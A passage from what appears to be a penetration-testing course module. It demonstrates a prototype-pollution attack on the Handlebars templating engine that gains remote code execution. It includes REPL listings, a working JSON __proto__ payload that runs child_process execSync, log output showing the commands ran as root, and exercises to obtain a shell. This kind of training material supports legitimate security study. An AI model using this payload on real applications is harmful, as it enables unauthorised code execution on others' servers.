  { type: 'MustacheStatement', path: 0, loc: 0, params: [ [Object] ] }
]

> precompiled = Handlebars.precompile("hello {{ foo }}")
'{"compiler":[8,">= 4.3.0"],"main":function(container,depth0,helpers,partials,data) {\n' +
  '    var stack1, lookupProperty = container.lookupProperty || function(parent, propertyName) {\n' +
  '        if (Object.prototype.hasOwnProperty.call(parent, propertyName)) {\n' +
  '          return parent[propertyName];\n' +
  '        }\n' +
  '        return undefined\n' +
  '    };\n' +
  '\n' +
  `  return ((stack1 = (lookupProperty(helpers,"undefined")||(depth0 && lookupProperty(depth0,"undefined"))||container.hooks.helperMissing).call(depth0 != null ? depth0 : (container.nullContext || {}),console.log('haxhaxhax'),{"name":"undefined","hash":{},"data":data,"loc":0})) != null ? stack1 : "");\n` +                                                                                                                   
  '},"useData":true}'
Listing 110 - Adding params to body in Object Prototype

At this point, the value is added to the compiled function. Now, let's try to execute the function and verify that our payload is being executed.

> eval("compiled = " + precompiled)
{ compiler: [ 8, '>= 4.3.0' ], main: [Function: main], useData: true }

> tem = Handlebars.template(compiled)
[Function: ret] {
  isTop: true,
  _setup: [Function (anonymous)],
  _child: [Function (anonymous)]
}

> tem()
haxhaxhax
Uncaught Error: Missing helper: "undefined"
    at Object.<anonymous> (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/helpers/helper-missing.js:19:13)
    at Object.wrapper (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/internal/wrapHelper.js:15:19)
    at Object.main (eval at <anonymous> (REPL183:1:1), <anonymous>:9:138)
    at main (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:208:32)
    at ret (/usr/src/app/node_modules/handlebars/dist/cjs/handlebars/runtime.js:212:12) {
  description: undefined,
  fileName: undefined,
  lineNumber: undefined,
  endLineNumber: undefined,
  number: undefined
}
Listing 111 - Rending Template with inject prototype pollution

Although we received an error, our console.log statement executed! Excellent!

Next, we need to apply the principles learned here to exploit the target application with an HTTP request. We'll modify the request payload to include the information we added to the prototype on the CLI.

"__proto__": 
{
  "type": "Program",
  "body":[
    {
      "type": "MustacheStatement",
      "path":0,
      "loc": 0,
      "params":[
        {
          "type": "NumberLiteral",
          "value": "console.log(process.mainModule.require('child_process').execSync('whoami').toString())" 
        } 
      ]
    }
  ]
}
Listing 112 - RCE __proto__ payload

We'll use an exploit payload that will print out the current user running the application. We'll use this payload in Burp.

Figure 28: Handlebars RCE exploit via Prototype Pollution
Figure 28: Handlebars RCE exploit via Prototype Pollution
When we send the request, we'll use the token in the response to create a connection.

Figure 29: Sending token from response
Figure 29: Sending token from response
As before, the prototype is polluted towards the end of the request. To trigger it, we need to load a new page.

Sending a GET request to the root generates an error. However, the docker-compose console includes the user that is running the application in the container (root).

chips_1     | root
chips_1     | 
chips_1     | root
chips_1     | 
chips_1     | GET / 500 39.494 ms - 1152
chips_1     | Error: /usr/src/app/views/hbs/error.hbs: Missing helper: "undefined"
...
Listing 113 - Console of Application Displaying User

Excellent! We have polluted the prototype to gain RCE on the application! This payload should be universal in other applications that use the Handlebars library.

Exercises
Follow along with this section but connect to the remote debugger and observe the prototype pollution exploit.

Obtain a shell using this exploit.

In this module we used the NumberLiteral type to reach RCE. Are there other types that might also result in RCE? What are they?

Extra Mile
Switch the Templating Engine to Pug and discover a path to RCE.

1 
(handlebars, 2020), https://github.com/handlebars-lang/handlebars-parser/blob/577a5f6336aaa5892ad3f10985d8eeb7124b1c7c/spec/visitor.js#L11 ↩︎

